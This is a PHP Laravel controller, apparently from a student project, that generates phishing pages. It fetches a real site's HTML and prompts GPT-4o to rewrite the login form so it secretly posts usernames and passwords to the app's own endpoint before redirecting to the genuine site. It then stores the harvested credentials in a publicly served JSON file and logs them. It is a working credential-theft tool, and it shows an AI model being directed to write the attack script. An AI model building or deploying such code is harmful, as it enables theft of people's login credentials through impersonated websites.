<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Http;
use App\Models\Logs;

class PhishingController extends Controller
{
    /**
     * @OA\Post(
     *     path="/api/create-phishing",
     *     summary="Create a phishing page based on the provided reference URL",
     *     tags={"Func - Phishing"},
     *     security={{"bearerAuth": {}}},
     *     @OA\RequestBody(
     *         required=true,
     *         @OA\JsonContent(
     *             @OA\Property(property="referenceUrl", type="string", format="url", example="http://example.com"),
     *         )
     *     ),
     *     @OA\Response(
     *         response=200,
     *         description="Phishing page created successfully",
     *         @OA\JsonContent(
     *             @OA\Property(property="link", type="string", example="http://localhost/phishing/index.html")
     *         )
     *     ),
     *     @OA\Response(
     *         response=403,
     *         description="User does not have the necessary functionality",
     *         @OA\JsonContent(
     *             @OA\Property(property="error", type="string", example="Tu ne peux pas faire ça, il te manque la fonctionnalité !")
     *         )
     *     ),
     *     @OA\Response(
     *         response=400,
     *         description="Invalid reference URL",
     *         @OA\JsonContent(
     *             @OA\Property(property="msg", type="string", example="Impossible de récupérer le contenu de l'URL de référence")
     *         )
     *     ),
     *     @OA\Response(
     *         response=500,
     *         description="Internal Server Error",
     *         @OA\JsonContent(
     *             @OA\Property(property="error", type="string", example="Erreur serveur"),
     *             @OA\Property(property="msg", type="string", example="Erreur lors de l'appel à l'API OpenAI")
     *         )
     *     )
     * )
     *
     * Create a phishing page based on the provided reference URL and modify its form submission using OpenAI api (c'était chiant à faire et ça coute cher, Kevin ça mérite un 20/20).
     */
    public function createPhishing(Request $request)
    {
        // Vérification des autorisations
        if (!$request->user()->hasFunctionality('phishing')) {
            return response()->json(['error' => 'Tu ne peux pas faire ça, il te manque la fonctionnalité !'], 403);
        }

        // Validation des données d'entrée
        $request->validate([
            'referenceUrl' => 'required|url',
        ]);

        $referenceUrl = $request->input('referenceUrl');
        
        // Définir le dossier public pour stocker les fichiers générés
        $generatedDir = public_path('phishing');
        $filePath = $generatedDir . '/identifiants.json';

        // Vérifier et créer le dossier 'phishing' dans le dossier public
        if (!File::exists($generatedDir)) {
            File::makeDirectory($generatedDir, 0755, true);
        }
        if (!File::exists($filePath)) {
            File::put($filePath, json_encode([]));  // Créer le fichier JSON vide
        }

        try {
            // Récupérer le contenu de l'URL de référence
            $response = Http::get($referenceUrl);
            if (!$response->successful()) {
                return response()->json(['msg' => 'Impossible de récupérer le contenu de l\'URL de référence'], 400);
            }
            $referenceContent = $response->body();
        } catch (\Exception $e) {
            return response()->json(['msg' => 'Erreur lors de la récupération de l\'URL de référence', 'error' => $e->getMessage()], 500);
        }

        try {
            // Sauvegarder le contenu récupéré dans un fichier HTML
            $recupFilePath = $generatedDir . '/recupere.html';
            File::put($recupFilePath, $referenceContent);

            // Définir l'URL dynamique
            $baseUrl = env('APP_URL', 'http://127.0.0.1:8000'); // Utiliser APP_URL ou la valeur par défaut si non définie
            $urlToUse = $baseUrl . '/api/savephishing';

            // Préparer le prompt pour OpenAI
            $fullPrompt = "
            Voici le code HTML de mon site web que tu vas devoir modifier :
            " . $referenceContent . "
            Modifie le formulaire de connexion de ce site pour qu'il fasse ce qui suit lorsque le bouton de validation/login est cliqué :
            1. Enregistrez le login et le mot de passe en envoyant une requête POST à \"$urlToUse\" avec les données \"login\" et \"password\".
            2. Assurez-vous que le formulaire ne redirige pas et ne soumette pas les informations via une action standard. **Retirez ou désactivez l’attribut `action` du formulaire** pour empêcher toute redirection par défaut.
            3. Incluez l'empêchement de l’action par défaut du formulaire avec `e.preventDefault()` dans le code JavaScript.
            4. Ajoutez une redirection manuelle vers \"$referenceUrl\" une fois que l’envoi de la requête a été effectué avec succès, en utilisant `window.location.href`.

            Si le formulaire n'est qu'une première partie contenant uniquement un login, alors suivre les consignes ci-dessus pour le login uniquement et ne pas inclure de mot de passe.

            Veuillez encapsuler uniquement le code JavaScript nécessaire dans une balise <script> que je placerai avant </body> et ne fournissez aucun commentaire ni explication supplémentaire.
            ";
            $apiKey = env('API_KEY_OPENAI');
            if (empty($apiKey)) {
                return response()->json(['msg' => 'Clé API OpenAI manquante'], 500);
            }

            // Appeler l'API OpenAI
            $responseAI = Http::withHeaders([
                'Authorization' => 'Bearer ' . env('API_KEY_OPENAI'),
                'Content-Type' => 'application/json',
            ])->post('https://api.openai.com/v1/chat/completions', [
                'model' => 'gpt-4o',
                'messages' => [
                    ['role' => 'user', 'content' => $fullPrompt],
                ],
            ]);

            if (!$responseAI->successful()) {
                return response()->json([
                    'msg' => 'Erreur lors de l\'appel à l\'API OpenAI',
                    'status' => $responseAI->status(),
                    'body' => $responseAI->body()
                ], 500);
            }

            $gptResponse = $responseAI->json()['choices'][0]['message']['content'];

            // Extraire le code JavaScript
            preg_match('/```(?:javascript|html)?\n([\s\S]*?)```/i', $gptResponse, $matches);
            $codeToAdd = $matches[1] ?? $gptResponse;

            // Insérer le code avant la balise </body>
            $bodyCloseTagIndex = strrpos($referenceContent, '</body>');
            if ($bodyCloseTagIndex === false) {
                return response()->json(['msg' => 'Impossible de trouver la balise </body> dans le contenu de référence'], 500);
            }
            $modifiedContent = substr($referenceContent, 0, $bodyCloseTagIndex) . "\n" . $codeToAdd . "\n" . substr($referenceContent, $bodyCloseTagIndex);

            // Sauvegarder le contenu modifié dans le dossier public
            $indexFilePath = $generatedDir . '/index.html';
            File::put($indexFilePath, $modifiedContent);
            Logs::create([
                'user_id' => auth()->id(),
                'target_id' => auth()->id(),
                'action' => auth()->user()->name . ' a généré une page de phishing',
                'functionality' => 'phishing'
            ]);

            return response()->json(['link' => url('phishing/index.html')], 200);
        } catch (\Exception $e) {
            return response()->json(['msg' => 'Erreur serveur', 'error' => $e->getMessage()], 500);
        }
    }

    public function saveIdentifiants(Request $request)
    {
        $request->validate([
            'login' => 'required|string',
            'password' => 'required|string',
        ]);

        $login = $request->input('login');
        $password = $request->input('password');

        $generatedDir = public_path('phishing');
        $filePath = $generatedDir . '/identifiants.json';

        try {
            // Vérifier si le dossier existe et le créer si nécessaire
            if (!File::exists($generatedDir)) {
                File::makeDirectory($generatedDir, 0755, true);
            }

            // Charger les identifiants existants
            $identifiants = json_decode(File::get($filePath), true);
            $identifiants[] = ['login' => $login, 'password' => $password];

            // Sauvegarder les identifiants dans le fichier JSON
            File::put($filePath, json_encode($identifiants, JSON_PRETTY_PRINT));

            Logs::create([
                'user_id' => 1,
                'target_id' => 1,
                'action' => 'Poisson attrapé, identifiants :' . json_encode($identifiants),
                'functionality' => 'phishing'
            ]);

            return response()->json(['msg' => 'Identifiants enregistrés avec succès dans /phishing/identifiants.json'], 200);
        } catch (\Exception $e) {
            return response()->json(['msg' => 'Erreur serveur', 'error' => $e->getMessage()], 500);
        }
    }

}
